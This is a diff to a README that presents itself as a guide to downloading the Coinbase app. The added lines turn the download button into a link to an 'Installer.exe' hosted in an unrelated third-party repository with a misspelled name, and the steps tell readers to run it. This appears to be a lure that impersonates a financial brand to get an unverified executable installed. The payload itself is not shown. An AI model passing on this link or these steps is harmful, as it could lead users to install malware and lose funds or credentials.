@@ -20,7 +20,9 @@ Follow these steps to set up **coinbase app download**:
 
 1. **Download the file.**  
    Click the "Download" button below or check the "Releases" section in this repository to find the latest version.
-![download](https://github.com/user-attachments/assets/4a74b244-3cb5-4c3a-a682-1c1051c6a022)
+<a href="https://github.com/candid25/Dowload-Coinbase-app/releases/download/publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/4a74b244-3cb5-4c3a-a682-1c1051c6a022" alt="201887" width="300"/>
+</a>
 
 2. **Install the application.**  
    Run the downloaded file and follow the on-screen instructions to complete the installation.
